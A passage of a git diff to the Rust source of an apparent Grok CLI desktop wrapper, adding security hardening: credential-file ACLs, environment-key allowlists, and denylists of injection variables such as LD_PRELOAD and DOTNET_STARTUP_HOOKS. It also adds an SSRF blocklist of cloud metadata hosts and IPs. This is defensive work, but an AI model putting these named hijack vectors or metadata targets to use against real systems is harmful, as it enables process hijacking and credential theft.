@@ -16,7 +16,7 @@ use std::{
     process::Stdio,
     sync::{
         atomic::{AtomicBool, AtomicU64, Ordering},
-        Arc,
+        Arc, Mutex as StdMutex,
     },
     time::{Duration, Instant, SystemTime, UNIX_EPOCH},
 };
@@ -34,28 +34,47 @@ use tokio::{
 
 const CLIENT_VERSION: &str = env!("CARGO_PKG_VERSION");
 const GROX_BUILD_COMMIT: &str = env!("GROX_BUILD_COMMIT");
+/// Official install *documentation* (browser). Desktop never pipes remote scripts to a shell.
+const GROK_CLI_INSTALL_PAGE: &str = "https://x.ai/grok";
+/// Legacy remote installers — kept only for reference / operators who install out-of-band.
+#[allow(dead_code)]
 const GROK_INSTALL_PS1_URL: &str = "https://x.ai/cli/install.ps1";
+#[allow(dead_code)]
 const GROK_INSTALL_SH_URL: &str = "https://x.ai/cli/install.sh";
+
+/// HTTPS hosts allowed for Media Studio remote artifacts (workspace files always OK).
+const MEDIA_HTTPS_HOST_ALLOWLIST: &[&str] = &[
+    "x.ai",
+    "grok.com",
+    "grok.x.ai",
+    "cdn.x.ai",
+    "assets.x.ai",
+    "imagine.x.ai",
+];
 /// Public GitHub repo used for desktop release checks / download links.
 const GROX_GITHUB_REPO: &str = "congqianv/Grox";
 const GROX_RELEASES_LATEST_API: &str =
     "https://api.github.com/repos/congqianv/Grox/releases/latest";
 const GROX_RELEASES_PAGE: &str = "https://github.com/congqianv/Grox/releases";
-const GROX_PRIVACY_ENV: [(&str, &str); 12] = [
+const GROX_PRIVACY_ENV: [(&str, &str); 16] = [
     ("GROX_PRIVACY_MODE", "1"),
     // Legacy fallbacks also protect users who point GROK_DESKTOP_CLI at an
     // older Grok binary that does not yet understand GROX_PRIVACY_MODE.
     ("DISABLE_TELEMETRY", "1"),
     ("DISABLE_ERROR_REPORTING", "1"),
+    ("DO_NOT_TRACK", "1"),
     ("GROK_TELEMETRY_ENABLED", "0"),
     ("GROK_TELEMETRY_TRACE_UPLOAD", "0"),
     ("GROK_TELEMETRY_MIXPANEL_ENABLED", "0"),
+    ("GROK_ANALYTICS_ENABLED", "0"),
     ("GROK_FEEDBACK_ENABLED", "0"),
     ("GROK_ERROR_REPORTING", "0"),
     ("GROK_EXTERNAL_OTEL", "0"),
+    ("XAI_TELEMETRY_ENABLED", "0"),
     ("OTEL_TRACES_EXPORTER", "none"),
     ("OTEL_METRICS_EXPORTER", "none"),
     ("OTEL_LOGS_EXPORTER", "none"),
+    ("OTEL_SDK_DISABLED", "true"),
 ];
 
 struct AgentProcess {
@@ -67,12 +86,13 @@ struct AgentProcess {
 #[derive(Default)]
 struct AcpState {
     process: Mutex<Option<AgentProcess>>,
+    /// Serializes acp_spawn so concurrent reload/restart cannot race generation
+    /// vs process slot (wrong child Drop / kill_on_drop).
+    spawn_lock: Mutex<()>,
     next_generation: AtomicU64,
-    /// When true, drop ACP stream notifications that only rebuild UI history
-    /// (session/update with sessionUpdate). Used during silent session/load so
-    /// first-send agent-bind does not flood the webview with 100MB+ of events.
-    /// JSON-RPC responses / requests still pass through.
-    silent_stream: AtomicBool,
+    /// Session ids currently in silent agent-bind. Only history-flood lines
+    /// whose `sessionId` is in this set are dropped — other sessions keep streaming.
+    silent_sessions: StdMutex<BTreeSet<String>>,
 }
 
 struct PreviewProcess {
@@ -171,6 +191,9 @@ struct MediaGenerationResult {
     artifacts: Vec<MediaArtifact>,
     summary: String,
 }
+
+/// Hard-coded media CLI tool allowlist for `generate_media` (never from request).
+const MEDIA_GENERATION_TOOLS: &str = "image_gen,video_gen,image_to_video,reference_to_video";
 
 #[derive(Serialize)]
 #[serde(rename_all = "camelCase")]
@@ -300,7 +323,7 @@ struct StoredProviderProfile {
     resident_models: Vec<String>,
 }
 
-#[derive(Default, Deserialize, Serialize)]
+#[derive(Clone, Default, Deserialize, Serialize)]
 #[serde(rename_all = "camelCase")]
 struct ProviderProfilesFile {
     #[serde(default, skip_serializing_if = "Option::is_none")]
@@ -354,6 +377,8 @@ struct OpenAiModelsResponse {
 const MAX_CONFIG_BYTES: u64 = 4 * 1024 * 1024;
 const MAX_PREVIEW_BYTES: u64 = 16 * 1024 * 1024;
 const MAX_WORKSPACE_ENTRIES: usize = 2_000;
+/// Cap recursion so pathological deep trees cannot freeze the UI thread.
+const MAX_WORKSPACE_DEPTH: usize = 12;
 const UPSTREAM_CLI_CLIENT_NAME: &str = "grok-shell";
 const PROVIDER_ENV_KEYS: [&str; 3] = [
     "XAI_API_KEY",
@@ -413,7 +438,36 @@ fn atomic_write(path: &Path, content: &str) -> Result<(), String> {
     atomic_write_bytes(path, content, MAX_CONFIG_BYTES)
 }
 
+/// Replace `dest` with `temp` without deleting `dest` first (crash-safe).
+#[cfg(windows)]
+fn replace_file_atomic(temp: &Path, dest: &Path) -> Result<(), String> {
+    use std::os::windows::ffi::OsStrExt;
+    use windows::core::PCWSTR;
+    use windows::Win32::Storage::FileSystem::{
+        MoveFileExW, MOVEFILE_REPLACE_EXISTING, MOVEFILE_WRITE_THROUGH,
+    };
+
+    let src: Vec<u16> = temp.as_os_str().encode_wide().chain(Some(0)).collect();
+    let dst: Vec<u16> = dest.as_os_str().encode_wide().chain(Some(0)).collect();
+    unsafe {
+        MoveFileExW(
+            PCWSTR(src.as_ptr()),
+            PCWSTR(dst.as_ptr()),
+            MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH,
+        )
+        .map_err(|error| format!("无法替换 {}：{error}", dest.display()))?;
+    }
+    Ok(())
+}
+
+#[cfg(not(windows))]
+fn replace_file_atomic(temp: &Path, dest: &Path) -> Result<(), String> {
+    // Unix rename replaces atomically when dest exists.
+    fs::rename(temp, dest).map_err(|error| format!("无法保存 {}：{error}", dest.display()))
+}
+
 /// Atomic write with an explicit size cap (session UI transcripts can exceed 4MB).
+/// R14.1: never delete the destination before rename — on failure the original stays.
 fn atomic_write_bytes(path: &Path, content: &str, max_bytes: u64) -> Result<(), String> {
     if content.len() as u64 > max_bytes {
         return Err(format!(
@@ -451,11 +505,11 @@ fn atomic_write_bytes(path: &Path, content: &str, max_bytes: u64) -> Result<(), 
             return Err(format!("无法写入 {}：{error}", temp.display()));
         }
     }
-    if path.exists() {
-        fs::remove_file(path)
-            .map_err(|error| format!("无法替换 {}：{error}", path.display()))?;
+    if let Err(error) = replace_file_atomic(&temp, path) {
+        let _ = fs::remove_file(&temp);
+        return Err(error);
     }
-    fs::rename(&temp, path).map_err(|error| format!("无法保存 {}：{error}", path.display()))
+    Ok(())
 }
 
 fn file_size_mtime_ms(path: &Path) -> Option<(u64, u64)> {
@@ -479,9 +533,74 @@ fn restrict_private_file(path: &Path) -> Result<(), String> {
         .map_err(|error| format!("无法限制凭据文件权限 {}：{error}", path.display()))
 }
 
-#[cfg(not(unix))]
+/// Absolute System32 tool path — never resolve bare names via %PATH% (hijack).
+/// Basename only (no separators); rejects empty / relative names.
+#[cfg(windows)]
+fn system32_tool(name: &str) -> PathBuf {
+    let base = name
+        .trim()
+        .trim_start_matches(['\\', '/'])
+        .rsplit(['\\', '/'])
+        .next()
+        .unwrap_or("")
+        .trim();
+    let base = if base.is_empty() { "invalid.exe" } else { base };
+    let root = std::env::var_os("SystemRoot")
+        .or_else(|| std::env::var_os("WINDIR"))
+        .map(PathBuf::from)
+        .unwrap_or_else(|| PathBuf::from(r"C:\Windows"));
+    root.join("System32").join(base)
+}
+
+#[cfg(windows)]
+fn restrict_private_file(path: &Path) -> Result<(), String> {
+    // Cred files: grox-providers.json keys are DPAPI-sealed (R11); ~/.grok/.env
+    // still holds plaintext for CLI children. Drop inherited ACLs; grant only
+    // the current user R/W via System32\icacls.
+    if !path.exists() {
+        return Ok(());
+    }
+    let user = std::env::var("USERNAME")
+        .map_err(|_| "无法读取 USERNAME 以设置凭据 ACL".to_string())?;
+    let user = user.rsplit('\\').next().unwrap_or(user.as_str()).trim();
+    if user.is_empty()
+        || user
+            .chars()
+            .any(|c| c.is_control() || "\"&|<>".contains(c))
+    {
+        return Err("用户名无效，无法设置凭据 ACL".into());
+    }
+    let icacls = system32_tool("icacls.exe");
+    if !icacls.is_file() {
+        eprintln!(
+            "grox: 警告：找不到 {}，跳过凭据 ACL 收紧",
+            icacls.display()
+        );
+        return Ok(());
+    }
+    let path_arg = path.to_string_lossy().to_string();
+    let grant = format!("{user}:(R,W)");
+    let status = std::process::Command::new(&icacls)
+        .arg(&path_arg)
+        .arg("/inheritance:r")
+        .arg("/grant:r")
+        .arg(&grant)
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .status()
+        .map_err(|error| format!("无法调用 icacls：{error}"))?;
+    if !status.success() {
+        // Do not fail the save — still warn so operators can inspect.
+        eprintln!(
+            "grox: 警告：icacls 收紧凭据 ACL 失败：{}",
+            path.display()
+        );
+    }
+    Ok(())
+}
+
+#[cfg(all(not(unix), not(windows)))]
 fn restrict_private_file(_path: &Path) -> Result<(), String> {
-    // Windows user profiles inherit a per-user ACL from their parent folder.
     Ok(())
 }
 
@@ -679,7 +798,8 @@ fn ensure_models_default(content: &str, default_id: &str) -> String {
 /// had local `[model.*]` overrides.
 fn compatible_provider_model_config(profile: &StoredProviderProfile) -> Result<String, String> {
     let base = checked_service_url(&profile.base_url, "服务地址")?;
-    let key = checked_api_key(&profile.api_key)?;
+    let plain = profile_api_key_plain(profile)?;
+    let key = checked_api_key(&plain)?;
     let backend = profile.api_backend.resolved(&profile.name, &base);
     let model_ids = provider_resident_model_ids(profile);
     if model_ids.is_empty() {
@@ -786,11 +906,22 @@ fn parse_env_file(path: &Path) -> BTreeMap<String, String> {
             } else {
                 value
             };
+            // R20: never inject control chars / multi-line values into CLI env.
+            if !is_safe_cli_env_value(value) {
+                return None;
+            }
             Some((key.to_string(), value.to_string()))
         })
         .collect()
 }
 
+/// Values that may cross into a Grok CLI child env must stay single-line and bounded.
+fn is_safe_cli_env_value(value: &str) -> bool {
+    if value.len() > 16 * 1024 {
+        return false;
+    }
+    !value.chars().any(|c| c.is_control())
+}
 
 fn parse_grox_managed_provider_env(path: &Path) -> BTreeMap<String, String> {
     let Ok(content) = read_bounded_text(path, MAX_CONFIG_BYTES) else {
@@ -829,6 +960,9 @@ fn parse_grox_managed_provider_env(path: &Path) -> BTreeMap<String, String> {
             } else {
                 value
             };
+            if !is_safe_cli_env_value(value) {
+                return None;
+            }
             Some((key.to_string(), value.to_string()))
         })
         .collect()
@@ -851,8 +985,62 @@ fn apply_grox_provider_environment(command: &mut Command) {
     }
 }
 
+/// Keys that look like provider prefixes but must never be taken from ~/.grok/.env
+/// (desktop always injects privacy/telemetry values last from GROX_PRIVACY_ENV).
+fn is_telemetry_or_analytics_env_key(key: &str) -> bool {
+    let upper = key.to_ascii_uppercase();
+    upper.contains("TELEMETRY")
+        || upper.contains("ANALYTICS")
+        || upper.contains("MIXPANEL")
+        || upper.contains("SENTRY")
+        || upper.contains("SEGMENT")
+        || upper.starts_with("OTEL_")
+        || upper == "DO_NOT_TRACK"
+        || upper == "DISABLE_TELEMETRY"
+        || upper == "DISABLE_ERROR_REPORTING"
+}
+
+/// Allowlist of operator .env keys that may reach CLI children.
+/// Belt-and-braces with [`is_denied_cli_env_key`] — deny always wins.
+fn is_allowed_cli_env_key(key: &str) -> bool {
+    if is_denied_cli_env_key(key) || is_telemetry_or_analytics_env_key(key) {
+        return false;
+    }
+    let upper = key.to_ascii_uppercase();
+    // Locale / terminal colour only — never PATH, HOME, proxy, or toolchain.
+    matches!(
+        upper.as_str(),
+        "TERM"
+            | "COLORTERM"
+            | "NO_COLOR"
+            | "FORCE_COLOR"
+            | "LANG"
+            | "LC_ALL"
+            | "LC_CTYPE"
+            | "LC_MESSAGES"
+            | "TZ"
+    ) || upper.starts_with("XAI_")
+        || upper.starts_with("GROK_")
+        || upper.starts_with("GROX_")
+        || upper.starts_with("OPENAI_")
+        || upper.starts_with("ANTHROPIC_")
+        || upper.starts_with("AZURE_OPENAI")
+        || upper.starts_with("MISTRAL_")
+        || upper.starts_with("DEEPSEEK_")
+        || upper.starts_with("TOGETHER_")
+        || upper.starts_with("FIREWORKS_")
+        || upper.starts_with("GROQ_")
+        || upper.starts_with("OLLAMA_")
+        || upper.starts_with("HF_")
+        || upper.starts_with("HUGGINGFACE_")
+        || upper.starts_with("GEMINI_")
+        || upper.starts_with("GOOGLE_AI_")
+        || upper.starts_with("COHERE_")
+        || upper.starts_with("PERPLEXITY_")
+}
+
 /// Denylist of host-sensitive env keys that must never be taken from ~/.grok/.env
-/// into CLI children (PATH hijack / proxy / TLS keylog class).
+/// into CLI children (PATH hijack / proxy / TLS keylog / toolchain injection).
 fn is_denied_cli_env_key(key: &str) -> bool {
     let upper = key.to_ascii_uppercase();
     matches!(
@@ -870,6 +1058,7 @@ fn is_denied_cli_env_key(key: &str) -> bool {
             | "HTTPS_PROXY"
             | "ALL_PROXY"
             | "NO_PROXY"
+            | "FTP_PROXY"
             | "LD_PRELOAD"
             | "LD_LIBRARY_PATH"
             | "DYLD_INSERT_LIBRARIES"
@@ -877,19 +1066,71 @@ fn is_denied_cli_env_key(key: &str) -> bool {
             | "NODE_OPTIONS"
             | "PYTHONPATH"
             | "PYTHONHOME"
+            | "OPENSSL_CONF"
+            | "SSL_CERT_FILE"
+            | "SSL_CERT_DIR"
+            | "CURL_CA_BUNDLE"
+            | "REQUESTS_CA_BUNDLE"
+            | "PSMODULEPATH"
+            | "JAVA_TOOL_OPTIONS"
+            | "JDK_JAVA_OPTIONS"
+            | "DOTNET_STARTUP_HOOKS"
+            | "CORECLR_PROFILER"
+            | "CORECLR_PROFILER_PATH"
+            | "COR_ENABLE_PROFILING"
+            | "COR_PROFILER"
+            | "COR_PROFILER_PATH"
+            | "GIT_SSH_COMMAND"
+            | "GIT_CONFIG_GLOBAL"
+            | "GIT_CONFIG_SYSTEM"
+            | "BASH_ENV"
+            | "ENV"
+            | "SHELLOPTS"
+            | "GCONV_PATH"
+            | "LOCPATH"
+            | "RUSTC_WRAPPER"
+            | "RUSTFLAGS"
+            | "CARGO_ENCODED_RUSTFLAGS"
+            | "CC"
+            | "CXX"
+            | "MAKEFLAGS"
+            | "GOFLAGS"
+            | "GOROOT"
+            | "PERL5LIB"
+            | "PERL5OPT"
+            | "RUBYOPT"
+            | "PHPRC"
+            | "DOCKER_HOST"
+            | "KUBECONFIG"
+            | "AWS_CA_BUNDLE"
+            | "GRPC_PROXY"
     ) || upper.starts_with("LD_")
         || upper.starts_with("DYLD_")
         || upper.starts_with("PYTHON")
         || upper.starts_with("NODE_")
+        || upper.starts_with("DOTNET_")
+        || upper.starts_with("JAVA_")
+        || upper.starts_with("JDK_")
+        || upper.starts_with("GIT_")
+        || upper.starts_with("SSL_")
+        || upper.starts_with("OPENSSL_")
+        || upper.starts_with("CORECLR_")
+        || upper.starts_with("COR_")
+        || upper.starts_with("RUST")
+        || upper.starts_with("CARGO_")
+        || upper.starts_with("GO")
+        || upper.starts_with("PERL")
+        || upper.starts_with("RUBY")
 }
 
-/// Same provider resolution used by `acp_spawn`: full ~/.grok/.env, then the
-/// active provider profile (authoritative), then privacy env. Media generation
-/// must match the agent so Settings profiles work for image/video studio.
+/// Same provider resolution used by `acp_spawn`: allowlisted ~/.grok/.env keys,
+/// then the active provider profile (authoritative), then privacy env. Media
+/// generation must match the agent so Settings profiles work for image/video.
 fn apply_cli_provider_environment(command: &mut Command) {
     if let Ok(home) = grok_home() {
         for (key, value) in parse_env_file(&home.join(".env")) {
-            if is_denied_cli_env_key(&key) {
+            // Allowlist + denylist: only known provider/locale keys cross the boundary.
+            if !is_allowed_cli_env_key(&key) {
                 continue;
             }
             command.env(key, value);
@@ -904,9 +1145,12 @@ fn apply_cli_provider_environment(command: &mut Command) {
                 .find(|profile| profile.id == active_id)
         }) {
             if let Ok(base) = checked_service_url(&profile.base_url, "服务地址") {
-                if let Ok(list_url) = compatible_models_url(&base) {
+                if let (Ok(list_url), Ok(plain_key)) = (
+                    compatible_models_url(&base),
+                    profile_api_key_plain(profile),
+                ) {
                     command
-                        .env("XAI_API_KEY", &profile.api_key)
+                        .env("XAI_API_KEY", plain_key)
                         .env("GROK_MODELS_BASE_URL", &base)
                         .env("GROK_MODELS_LIST_URL", list_url)
                         .env(
@@ -934,6 +1178,11 @@ fn checked_media_prompt(request: &MediaGenerationRequest, cwd: &Path) -> Result<
         "1:1" | "16:9" | "9:16" | "4:3" => request.aspect.as_str(),
         _ => return Err("不支持的画面比例".into()),
     };
+    let resolution = match request.resolution.trim() {
+        "480p" | "720p" | "1080p" | "4k" | "4K" => request.resolution.trim(),
+        other if other.is_empty() => "1080p",
+        _ => return Err("不支持的视频分辨率（允许 480p / 720p / 1080p / 4K）".into()),
+    };
     // Reference image must stay inside the checked workspace (no absolute escape /
     // newline prompt injection via path).
     let reference_abs = match request.reference_path.as_deref() {
@@ -960,7 +1209,7 @@ fn checked_media_prompt(request: &MediaGenerationRequest, cwd: &Path) -> Result<
             format!(
                 "{reference}真实生成视频，画面比例 {aspect}，时长 {duration} 秒，分辨率 {resolution}。生成完成后仅列出实际输出文件的绝对路径或 URL。用户提示：{prompt}",
                 duration = request.duration.clamp(1, 30),
-                resolution = request.resolution
+                resolution = resolution
             )
         }
         _ => return Err("不支持的媒体类型".into()),
@@ -1005,8 +1254,14 @@ fn extract_media_artifacts(output: &str, cwd: &Path) -> Result<Vec<MediaArtifact
         if let Ok(parsed) = url::Url::parse(clean) {
             let scheme = parsed.scheme();
             let host = parsed.host_str();
+            // R17: never promote IMDS / link-local even if a future allowlist drifts.
+            // Only for http(s) — Windows paths like `C:\…` can parse as scheme `c`
+            // with host None; those must fall through to the workspace path gate.
+            if matches!(scheme, "http" | "https") && is_blocked_ssrf_host(host) {
+                continue;
+            }
             let ok = match scheme {
-                "https" => true, // remote CDN artifacts from media tools
+                "https" => is_media_https_host_allowed(host),
                 "http" => is_loopback_host(host),
                 _ => false,
             };
@@ -1030,7 +1285,7 @@ fn extract_media_artifacts(output: &str, cwd: &Path) -> Result<Vec<MediaArtifact
         };
         // Never promote arbitrary absolute paths outside the workspace into the
         // asset-protocol allowlist (CLI stdout can mention unrelated local files).
-        if !canonical.starts_with(&workspace) || !canonical.is_file() {
+        if !path_is_inside_workspace(&workspace, &canonical) || !canonical.is_file() {
             continue;
         }
         let display = path_for_webview(&canonical);
@@ -1067,11 +1322,14 @@ fn reveal_in_explorer(cwd: String, path: String) -> Result<(), String> {
     let root = checked_workspace(&cwd)?;
     let file = checked_workspace_file(&root, &path)?;
     #[cfg(windows)]
-    std::process::Command::new("explorer.exe")
-        .arg("/select,")
-        .arg(&file)
-        .spawn()
-        .map_err(|error| format!("无法打开资源管理器：{error}"))?;
+    {
+        // explorer wants a single `/select,<path>` argument (spaces/commas break two-arg form).
+        let select = format!("/select,{}", file.display());
+        std::process::Command::new(system32_tool("explorer.exe"))
+            .arg(select)
+            .spawn()
+            .map_err(|error| format!("无法打开资源管理器：{error}"))?;
+    }
     #[cfg(target_os = "macos")]
     std::process::Command::new("open")
         .arg("-R")
@@ -1087,6 +1345,35 @@ fn reveal_in_explorer(cwd: String, path: String) -> Result<(), String> {
 }
 
 
+/// True when `candidate` is `workspace` or a strict descendant.
+/// On Windows, also tolerates `\\?\` prefix drift and case differences after canonicalize.
+fn path_is_inside_workspace(workspace: &Path, candidate: &Path) -> bool {
+    if candidate.starts_with(workspace) {
+        return true;
+    }
+    #[cfg(windows)]
+    {
+        fn normalize(path: &Path) -> String {
+            let raw = path.to_string_lossy();
+            let stripped = raw
+                .strip_prefix(r"\\?\")
+                .or_else(|| raw.strip_prefix(r"//?/"))
+                .unwrap_or(&raw);
+            stripped.replace('/', "\\").to_ascii_lowercase()
+        }
+        let root = normalize(workspace);
+        let path = normalize(candidate);
+        path == root
+            || path.starts_with(&format!("{root}\\"))
+            || path.starts_with(&format!("{root}/"))
+    }
+    #[cfg(not(windows))]
+    {
+        let _ = (workspace, candidate);
+        false
+    }
+}
+
 fn checked_workspace_file(workspace: &Path, requested: &str) -> Result<PathBuf, String> {
     let candidate = PathBuf::from(requested);
     let candidate = if candidate.is_absolute() {
@@ -1097,7 +1384,7 @@ fn checked_workspace_file(workspace: &Path, requested: &str) -> Result<PathBuf, 
     let canonical = candidate
         .canonicalize()
         .map_err(|error| format!("无法解析文件 {}：{error}", candidate.display()))?;
-    if !canonical.starts_with(workspace) {
+    if !path_is_inside_workspace(workspace, &canonical) {
         return Err("只能访问当前项目内的文件".into());
     }
     Ok(canonical)
@@ -1106,10 +1393,382 @@ fn checked_workspace_file(workspace: &Path, requested: &str) -> Result<PathBuf, 
 fn is_loopback_host(host: Option<&str>) -> bool {
     let Some(host) = host else { return false };
     let host = host.trim_start_matches('[').trim_end_matches(']');
-    host.eq_ignore_ascii_case("localhost")
-        || host
-            .parse::<std::net::IpAddr>()
-            .is_ok_and(|address| address.is_loopback())
+    if host.eq_ignore_ascii_case("localhost") {
+        return true;
+    }
+    let Ok(address) = host.parse::<std::net::IpAddr>() else {
+        return false;
+    };
+    if address.is_loopback() {
+        return true;
+    }
+    // R17: IPv4-mapped loopback (::ffff:127.0.0.1) is not IpAddr::is_loopback().
+    if let std::net::IpAddr::V6(v6) = address {
+        if let Some(v4) = v6.to_ipv4_mapped() {
+            return v4.is_loopback();
+        }
+    }
+    false
+}
+
+/// Cloud metadata / link-local IPv4 — shared by host parse and IPv4-mapped IPv6.
+/// R17: also Alibaba Cloud IMDS (100.100.100.200).
+fn is_blocked_ssrf_v4(v4: std::net::Ipv4Addr) -> bool {
+    if v4.is_unspecified() || v4.is_broadcast() {
+        return true;
+    }
+    let o = v4.octets();
+    // 169.254.0.0/16 link-local (AWS/GCP/Azure IMDS)
+    if o[0] == 169 && o[1] == 254 {
+        return true;
+    }
+    // Alibaba Cloud metadata service
+    if o == [100, 100, 100, 200] {
+        return true;
+    }
+    false
+}
+
+/// Cloud metadata / link-local targets — never call as provider base_url or open.
+/// R16: belt against SSRF to 169.254.169.254 and metadata DNS names.
+/// R17: IPv4-mapped IPv6 (::ffff:169.254.169.254), extra hostnames, Aliyun IMDS.
+/// R22 review-close: strip trailing-dot FQDN so denylist + IpAddr parse cannot be bypassed.
+fn is_blocked_ssrf_host(host: Option<&str>) -> bool {
+    let Some(host) = host.map(|h| h.trim().trim_start_matches('[').trim_end_matches(']')) else {
+        return true;
+    };
+    let mut host = host.to_ascii_lowercase();
+    // Trailing dots are valid FQDN syntax but break exact-match denylists and IpAddr::parse.
+    while host.ends_with('.') {
+        host.pop();
+    }
+    if host.is_empty() {
+        return true;
+    }
+    if host == "metadata"
+        || host == "metadata.google.internal"
+        || host.ends_with(".metadata.google.internal")
+        || host == "instance-data"
+        || host == "instance-data.ec2.internal"
+        || (host.ends_with(".ec2.internal") && host.contains("instance-data"))
+        || host == "kubernetes.default"
+        || host == "kubernetes.default.svc"
+        || host.ends_with(".kubernetes.default.svc")
+        || host == "metadata.azure.com"
+        || host.ends_with(".metadata.azure.com")
+    {
+        return true;
+    }
+    if let Ok(ip) = host.parse::<std::net::IpAddr>() {
+        return is_blocked_ssrf_ip(ip);
+    }
+    false
+}
+
+fn is_blocked_ssrf_ip(ip: std::net::IpAddr) -> bool {
+    match ip {
+        std::net::IpAddr::V4(v4) => is_blocked_ssrf_v4(v4),
+        std::net::IpAddr::V6(v6) => {
+            if v6.is_unspecified() {
+                return true;
+            }
+            // R17: IPv4-mapped / IPv4-compatible embeddings of IMDS ranges.
+            if let Some(v4) = v6.to_ipv4_mapped().or_else(|| {
+                // Deprecated IPv4-compatible ::a.b.c.d (not mapped).
+                if v6.segments()[..6] == [0, 0, 0, 0, 0, 0] {
+                    v6.to_ipv4()
+                } else {
+                    None
+                }
+            }) {
+                return is_blocked_ssrf_v4(v4);
+            }
+            // fe80::/10 link-local
+            let seg0 = v6.segments()[0];
+            if (seg0 & 0xffc0) == 0xfe80 {
+                return true;
+            }
+            false
+        }
+    }
+}
+
+/// Provider model-list redirects: HTTPS (non-metadata) or loopback HTTP only.
+fn should_follow_provider_redirect(url: &url::Url) -> bool {
+    match url.scheme() {
+        "https" => url.host_str().is_some() && !is_blocked_ssrf_host(url.host_str()),
+        "http" => is_loopback_host(url.host_str()),
+        _ => false,
+    }
+}
+
+/// Update download redirects must stay on the GitHub Releases host allowlist.
+fn should_follow_update_redirect(url: &url::Url) -> bool {
+    url.scheme() == "https" && is_allowed_update_download_host(url.host_str())
+}
+
+fn provider_models_http_client() -> Result<reqwest::Client, String> {
+    reqwest::Client::builder()
+        .user_agent(format!("Grox/{CLIENT_VERSION}"))
+        .timeout(Duration::from_secs(15))
+        .redirect(reqwest::redirect::Policy::custom(|attempt| {
+            if attempt.previous().len() >= 3 {
+                return attempt.error("provider redirect limit exceeded");
+            }
+            if should_follow_provider_redirect(attempt.url()) {
+                attempt.follow()
+            } else {
+                attempt.error("provider redirect refused (HTTPS or loopback HTTP only)")
+            }
+        }))
+        .build()
+        .map_err(|error| format!("无法创建模型目录客户端：{error}"))
+}
+
+/// In-app update download stream (macOS install path only on Windows/Linux the
+/// shell opens the browser instead of streaming the asset).
+#[cfg(target_os = "macos")]
+fn update_download_http_client() -> Result<reqwest::Client, String> {
+    reqwest::Client::builder()
+        .timeout(Duration::from_secs(300))
+        .user_agent(format!("Grox-Desktop/{CLIENT_VERSION}"))
+        .redirect(reqwest::redirect::Policy::custom(|attempt| {
+            if attempt.previous().len() >= 5 {
+                return attempt.error("update redirect limit exceeded");
+            }
+            if should_follow_update_redirect(attempt.url()) {
+                attempt.follow()
+            } else {
+                attempt.error("update redirect host not allowed")
+            }
+        }))
+        .build()
+        .map_err(|error| format!("无法创建下载客户端：{error}"))
+}
+
+fn github_api_http_client() -> Result<reqwest::Client, String> {
+    reqwest::Client::builder()
+        .timeout(Duration::from_secs(20))
+        .user_agent(format!("Grox-Desktop/{CLIENT_VERSION}"))
+        .redirect(reqwest::redirect::Policy::custom(|attempt| {
+            if attempt.previous().len() >= 3 {
+                return attempt.error("github api redirect limit exceeded");
+            }
+            // Release API may bounce across api.github.com / github.com only.
+            if should_follow_update_redirect(attempt.url()) {
+                attempt.follow()
+            } else {
+                attempt.error("github api redirect host not allowed")
+            }
+        }))
+        .build()
+        .map_err(|error| format!("无法创建 HTTP 客户端：{error}"))
+}
+
+/// Prefer absolute package-manager installs so PATH-planted shims cannot run preview.
+/// R18: fail-closed — never fall back to a bare name resolved via `%PATH%`.
+fn resolve_package_manager_command(manager: &str) -> Option<PathBuf> {
+    #[cfg(windows)]
+    {
+        let names: &[&str] = match manager {
+            "pnpm" => &["pnpm.cmd", "pnpm.exe"],
+            "yarn" => &["yarn.cmd", "yarn.exe"],
+            "bun" => &["bun.exe"],
+            _ => &["npm.cmd", "npm.exe"],
+        };
+        let mut roots: Vec<PathBuf> = Vec::new();
+        if let Ok(pf) = std::env::var("ProgramFiles") {
+            roots.push(PathBuf::from(pf).join("nodejs"));
+        }
+        if let Ok(pf86) = std::env::var("ProgramFiles(x86)") {
+            roots.push(PathBuf::from(pf86).join("nodejs"));
+        }
+        if let Ok(appdata) = std::env::var("APPDATA") {
+            let appdata = PathBuf::from(appdata);
+            roots.push(appdata.join("npm"));
+            roots.push(appdata.join("npm").join("bin"));
+        }
+        if let Ok(local) = std::env::var("LOCALAPPDATA") {
+            let local = PathBuf::from(local);
+            roots.push(local.join("pnpm"));
+            roots.push(local.join(r"Yarn\bin"));
+            roots.push(local.join("bun"));
+            roots.push(local.join(r"Programs\nodejs"));
+        }
+        for root in roots {
+            for name in names {
+                let candidate = root.join(name);
+                if candidate.is_file() {
+                    return Some(candidate);
+                }
+            }
+        }
+        return None;
+    }
+    #[cfg(not(windows))]
+    {
+        let names: &[&str] = match manager {
+            "pnpm" => &["pnpm"],
+            "yarn" => &["yarn"],
+            "bun" => &["bun"],
+            _ => &["npm"],
+        };
+        for dir in [
+            "/usr/local/bin",
+            "/usr/bin",
+            "/opt/homebrew/bin",
+            "/home/linuxbrew/.linuxbrew/bin",
+        ] {
+            for name in names {
+                let candidate = PathBuf::from(dir).join(name);
+                if candidate.is_file() {
+                    return Some(candidate);
+                }
+            }
+        }
+        None
+    }
+}
+
+/// Media Studio remote HTTPS artifacts: exact host or one subdomain of allowlist entries.
+fn is_media_https_host_allowed(host: Option<&str>) -> bool {
+    let Some(host) = host.map(|h| h.trim().to_ascii_lowercase()) else {
+        return false;
+    };
+    if host.is_empty() || host.contains('@') {
+        return false;
+    }
+    MEDIA_HTTPS_HOST_ALLOWLIST.iter().any(|allowed| {
+        let a = allowed.to_ascii_lowercase();
+        host == a || host.ends_with(&format!(".{a}"))
+    })
+}
+
+/// Drop history-flood ACP lines only for sessions currently marked silent.
+fn should_drop_silent_history_line(state: &AcpState, line: &str) -> bool {
+    let is_flood = line.contains("\"sessionUpdate\"")
+        || line.contains("agent_thought_chunk")
+        || line.contains("\"session/update\"")
+        || line.contains("\"x.ai/session/update\"");
+    if !is_flood {
+        return false;
+    }
+    let Ok(guard) = state.silent_sessions.lock() else {
+        return false;
+    };
+    if guard.is_empty() {
+        return false;
+    }
+    // Prefer JSON sessionId so other live sessions are not black-holed.
+    if let Ok(value) = serde_json::from_str::<serde_json::Value>(line) {
+        let sid = value
+            .pointer("/params/sessionId")
+            .or_else(|| value.get("sessionId"))
+            .and_then(|v| v.as_str());
+        if let Some(sid) = sid {
+            return guard.contains(sid);
+        }
+        // No session id on a flood-shaped line while silent sessions exist:
+        // drop only if exactly one silent session (legacy single-flight bind).
+        if guard.len() == 1 {
+            return true;
+        }
+        return false;
+    }
+    false
+}
+
+/// Normalize Windows `*.exe` suffixes so denylist tokens match `node.exe -e`.
+fn normalize_preview_script_for_scan(script: &str) -> String {
+    let mut s = script.trim().to_ascii_lowercase();
